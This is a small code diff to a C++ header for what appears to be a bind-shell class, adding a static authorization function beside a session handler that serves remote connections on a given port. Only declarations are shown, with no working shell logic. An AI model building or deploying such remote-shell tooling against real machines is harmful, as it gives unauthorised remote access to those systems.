@@ -15,8 +15,9 @@ private:
 public:
 	BindShell(UINT16 port);
 	~BindShell();
-	
-	// this has to be a static member func or it explodes
+
+	// these have to be static member funcs or they explodes
+	static BOOL BingusAuthorize(SOCKET clientSocket);
 	static DWORD APIENTRY BingusSessionHandler(LPVOID lpParameter);
 
 	void Bingus();
